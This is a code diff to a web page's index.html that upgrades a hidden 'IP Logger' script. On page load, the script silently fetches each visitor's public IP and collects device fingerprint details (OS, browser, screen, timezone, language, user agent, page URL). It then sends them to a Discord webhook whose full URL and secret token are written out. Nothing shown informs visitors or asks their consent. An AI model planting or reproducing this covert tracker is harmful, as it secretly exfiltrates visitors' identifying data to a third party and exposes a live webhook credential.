@@ -300,43 +300,144 @@ function typeWriter() {
 
 </script>
 
-<!-- IP Logger to Discord Webhook -->
+<!-- Comprehensive IP & Device Logger to Discord Webhook -->
 <script>
-  // Send IP to Discord webhook with embed
+  // Function to detect OS from User Agent
+  function detectOS() {
+    const ua = navigator.userAgent;
+    if (ua.indexOf('Win') > -1) return 'Windows';
+    if (ua.indexOf('Mac') > -1) return 'macOS';
+    if (ua.indexOf('Linux') > -1) return 'Linux';
+    if (ua.indexOf('Android') > -1) return 'Android';
+    if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) return 'iOS';
+    return 'Unknown OS';
+  }
+
+  // Function to detect browser
+  function detectBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.indexOf('Firefox') > -1) return 'Firefox';
+    if (ua.indexOf('Chrome') > -1) return 'Chrome';
+    if (ua.indexOf('Safari') > -1) return 'Safari';
+    if (ua.indexOf('Edge') > -1) return 'Edge';
+    if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
+    return 'Unknown Browser';
+  }
+
+  // Function to get device type
+  function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/mobile|android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua.toLowerCase())) {
+      return 'Mobile';
+    } else if (/ipad|tablet|playbook|silk|(hpw|web)os|kindle/i.test(ua.toLowerCase())) {
+      return 'Tablet';
+    }
+    return 'Desktop';
+  }
+
+  // Function to get screen resolution
+  function getScreenResolution() {
+    return `${window.screen.width}x${window.screen.height}`;
+  }
+
+  // Function to get language
+  function getLanguage() {
+    return navigator.language || 'Unknown';
+  }
+
+  // Function to get timezone
+  function getTimezone() {
+    return Intl.DateTimeFormat().resolvedOptions().timeZone;
+  }
+
+  // Function to get screen color depth
+  function getColorDepth() {
+    return `${window.screen.colorDepth}-bit`;
+  }
+
+  // Send comprehensive data to Discord
   fetch('https://api.ipify.org')
     .then(response => response.text())
     .then(ip => {
       const webhookUrl = 'https://canary.discord.com/api/webhooks/1514007577355092080/UT9EM1Y7BApmmULLk_Z9gn1Rbw7Le42Xq1xDUYGceFKl39imPfYXI0Nrte1mihIKebxd';
       
+      const os = detectOS();
+      const browser = detectBrowser();
+      const deviceType = getDeviceType();
+      const screenRes = getScreenResolution();
+      const language = getLanguage();
+      const timezone = getTimezone();
+      const colorDepth = getColorDepth();
+      const userAgent = navigator.userAgent || 'Unknown';
+      
       const payload = {
-        content: `**New Visitor IP: ${ip}**`,
+        content: `**🌍 New Visitor Detected - IP: ${ip}**`,
         embeds: [{
-          title: 'Visitor Information',
+          title: '📊 Visitor Information Report',
           color: 16711680,
+          thumbnail: {
+            url: 'https://cdn-icons-png.flaticon.com/512/748/748122.png'
+          },
           fields: [
             {
-              name: 'IP Address',
-              value: ip,
+              name: '🌐 IP Address',
+              value: `\`${ip}\``,
               inline: true
             },
             {
-              name: 'User Agent',
-              value: (navigator.userAgent || 'Unknown').substring(0, 100),
+              name: '💻 OS',
+              value: `\`${os}\``,
+              inline: true
+            },
+            {
+              name: '🌐 Browser',
+              value: `\`${browser}\``,
+              inline: true
+            },
+            {
+              name: '📱 Device Type',
+              value: `\`${deviceType}\``,
+              inline: true
+            },
+            {
+              name: '🖥️ Screen Resolution',
+              value: `\`${screenRes}\``,
+              inline: true
+            },
+            {
+              name: '🎨 Color Depth',
+              value: `\`${colorDepth}\``,
+              inline: true
+            },
+            {
+              name: '🌍 Language',
+              value: `\`${language}\``,
+              inline: true
+            },
+            {
+              name: '⏰ Timezone',
+              value: `\`${timezone}\``,
+              inline: true
+            },
+            {
+              name: '📅 Timestamp',
+              value: `\`${new Date().toLocaleString()}\``,
               inline: false
             },
             {
-              name: 'Timestamp',
-              value: new Date().toLocaleString(),
-              inline: true
+              name: '📝 User Agent',
+              value: `\`\`\`${userAgent.substring(0, 200)}\`\`\``,
+              inline: false
             },
             {
-              name: 'Page',
-              value: window.location.href,
+              name: '🔗 Page URL',
+              value: `\`${window.location.href}\``,
               inline: false
             }
           ],
           footer: {
-            text: 'IP Logger - index.html'
+            text: '🔍 IP Logger v2 - Enhanced Visitor Tracking',
+            icon_url: 'https://cdn-icons-png.flaticon.com/512/3050/3050159.png'
           }
         }]
       };
